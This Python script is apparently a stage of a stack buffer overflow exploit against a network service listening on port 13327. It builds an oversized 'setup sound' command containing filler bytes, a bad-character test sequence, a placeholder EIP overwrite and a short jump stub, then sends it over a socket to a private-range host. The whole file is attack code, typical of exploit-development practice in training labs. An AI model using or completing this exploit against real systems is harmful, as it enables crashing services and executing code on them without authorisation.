#!/usr/bin/python
import socket
import subprocess


host = "192.168.196.44"

pattern_size = 4379

"""result = subprocess.run(["msf-pattern_create","-l", "{}".format(pattern_size)]
, stderr= subprocess.PIPE, stdout=subprocess.PIPE)
crash = result.stdout"""
##print(result.stderr)

##print(crash)
input_buf = b"\x41" * 1000

bad = [0,0x20]
for i in range(256):
    if (i not in bad):
        input_buf+= i.to_bytes(1,"little")
input_buf += b"\x41" * (4368 - len(input_buf))

eip = b"\x42"*4

first_stage = b"\x83\xc0\x0c\xff\xe0\x90\x90"


##first_stage = b""
a = 0
"""for i in range(a,a+5):
    if(i not in bad):
        first_stage += i.to_bytes(1,'little')"""


crash = input_buf + eip + first_stage

buffer = b"\x11(setup sound " + crash + b"\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print ("[*]Sending evil buffer...")

s.connect((host, 13327))
print (s.recv(1024))

s.send(buffer)
s.close()

print ("[*]Payload Sent !")